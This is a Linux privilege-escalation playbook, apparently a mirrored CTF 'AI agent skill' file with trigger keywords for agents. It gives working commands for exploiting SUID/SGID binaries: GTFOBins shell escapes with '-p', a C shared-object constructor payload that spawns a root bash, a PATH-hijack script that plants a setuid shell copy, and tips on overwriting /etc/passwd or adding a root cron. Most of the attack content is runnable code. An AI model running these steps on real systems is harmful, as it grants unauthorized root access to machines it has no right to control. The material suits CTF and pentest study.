# SUID / SGID Privilege Escalation

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/host-linux/suid-sgid.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/host-linux/suid-sgid.md)

---

---
name: suid-sgid
category: host-linux
triggers: ["SUID binary", "SGID binary", "perm -4000", "find suid", "GTFOBins SUID", "shared object injection", "PATH abuse suid"]
tools: ["find", "GTFOBins", "gcc", "strings", "ltrace", "strace"]
priority: high
description: Enumerate and exploit set-uid/set-gid binaries via GTFOBins escapes, shared-object injection, or PATH abuse.
---
# SUID / SGID Privilege Escalation

## Trigger context
Enumeration found one or more files with the SUID bit (`-rwsr-xr-x`, perm `4000`) or SGID bit (`-rwxr-sr-x`, perm `2000`). A SUID-root binary runs with root's euid regardless of who launches it, so abusing one yields root.

## Objective
Turn a SUID-root (or SGID) binary into arbitrary code execution as root (or the file's group), producing a privileged shell or a write to a root-only resource.

## Methodology (decision tree)
1. Enumerate SUID and SGID files across the whole filesystem.
2. Subtract the defaults (passwd, sudo, mount, ping, su, umount, pkexec, etc. are normal) and focus on anything unusual: custom binaries, scripting interpreters, archivers, editors, non-standard paths.
3. For each candidate:
   - GTFOBins has a **SUID** entry -> use its `-p` escape.
   - Custom binary -> `strings`/`ltrace`/`strace` it. Does it call another program by relative name (PATH abuse), run `system()`/`popen()`, or `dlopen()` a writable library (SO injection)?
   - Known package with a CVE (e.g. old `pkexec`, `screen`, `exim`) -> match version.
4. Remember `-p` on the spawned shell — without it bash/dash drop the elevated euid.

## Commands & payloads
```bash
# --- Enumerate ---
find / -perm -4000 -type f 2>/dev/null            # SUID
find / -perm -2000 -type f 2>/dev/null            # SGID
find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;   # with details
# Compare against a known-good list to spot the odd one out.

# --- Direct GTFOBins SUID escapes (note the -p everywhere) ---
./find . -exec /bin/sh -p \; -quit                # find
./bash -p                                         # if bash itself is SUID
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash 2>/dev/null   # (if you can set the bit)
./vim -c ':py3 import os; os.execl("/bin/sh","sh","-pc","reset; exec sh -p")'   # vim
./less /etc/profile      # then !/bin/sh -p    (less inherits euid)
./nmap --interactive     # old nmap: !sh
./python -c 'import os; os.setuid(0); os.system("/bin/sh")'   # python SUID
./env /bin/sh -p                                  # env
./cp --preserve=mode ...  # cp SUID -> overwrite /etc/passwd or a root cron
./systemctl / ./start-stop-daemon / ./tar / ./nano / ./awk  # all have GTFOBins SUID entries

# --- Shared-object (.so) injection ---
strace -v -f -e trace=open,openat,stat ./vuln_suid 2>&1 | grep -iE 'so$|ENOENT'  # find a missing/writable lib
ltrace ./vuln_suid                                 # spot dlopen / library calls
cat > /tmp/lib.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
static void inj() __attribute__((constructor));
void inj(){ setuid(0); setgid(0); system("/bin/bash -p"); }
EOF
gcc -shared -fPIC -o /path/to/missing_or_writable.so /tmp/lib.c
./vuln_suid                                        # loads our .so as root

# --- PATH abuse: SUID binary calls e.g. `service`/`ps`/`id` by relative name ---
strings ./vuln_suid | grep -iE 'system|popen|exec|/bin/|service|ps|cat'  # spot the call
cd /tmp
printf '#!/bin/bash\ncp /bin/bash /tmp/rb; chmod +s /tmp/rb\n' > service   # fake the called cmd
chmod +x service
export PATH=/tmp:$PATH
./vuln_suid                                         # runs our fake `service` as root
/tmp/rb -p                                          # rootbash
```

## Branching logic
- Binary is a standard interpreter/tool with a GTFOBins SUID entry -> use it directly with `-p`.
- Custom binary calling `system("cmd")`/`popen` with a **relative** command name -> PATH hijack (fastest win).
- Custom binary calling `system("/bin/sh -c 'ID'")` where ID is not absolute, or `execlp` -> also PATH.
- `dlopen()` of a relative/writable `.so`, or an ENOENT on a lib in a writable dir -> SO injection.
- Full absolute paths everywhere and no shell-out -> look for a buffer overflow / format string, or move on to another vector.
- SGID (not SUID) binary -> you gain the file's GROUP, not uid 0. Useful if that group can read `/etc/shadow`, write cron, or access sockets — chain it.
- `cp`/`tar`/`dd` SUID -> don't spawn a shell; instead overwrite `/etc/passwd` (add a root user) or drop a root cron.

## Common pitfalls
- Omitting `-p`: modern bash/dash reset euid->ruid on startup, silently dropping you back to your own user. Always `-p`, and verify with `id`.
- Assuming every SUID binary is exploitable — most defaults are hardened. Focus effort on the anomalies.
- `noexec` on the mount where you compiled the `.so` won't matter (the SUID binary loads it), but a `.so` with wrong arch/permissions fails silently — match arch (`file ./vuln_suid`) and make it world-readable.
- PATH hijack fails if the SUID program hard-codes absolute paths or drops the environment — check with `strings`/`ltrace` first.
- Bash refuses to honour SUID on its own script wrappers; the SUID bit only matters on the ELF/interpreter actually exec'd.

## Proof / verification
- `id` inside the spawned shell shows `euid=0(root)` (or `uid=0` after setuid).
- Independent proof: read `/etc/shadow`, or `cat /root/root.txt`.
- For SO injection, confirm your constructor ran (a marker file or the shell prompt) rather than assuming.

## Cross-references
- [sa--instructions--host-linux--sudo-gtfobins.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--sudo-gtfobins.md) — same GTFOBins tools, sudo context (no `-p`).
- [sa--instructions--host-linux--cron-path-hijack.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--cron-path-hijack.md) — deeper PATH-hijack and writable-dir mechanics.
- [sa--instructions--host-linux--capabilities.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--capabilities.md) — `cap_setuid` binaries behave like SUID without the bit.
- [sa--instructions--host-linux--kernel-and-misc-privesc.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--kernel-and-misc-privesc.md) — pkexec/other setuid-helper CVEs.

## Credible sources
- GTFOBins (SUID function): https://gtfobins.github.io/
- HackTricks SUID/SGID abuse: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- GTFOBins find (SUID example): https://gtfobins.github.io/gtfobins/find/
- PayloadsAllTheThings Linux privesc: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
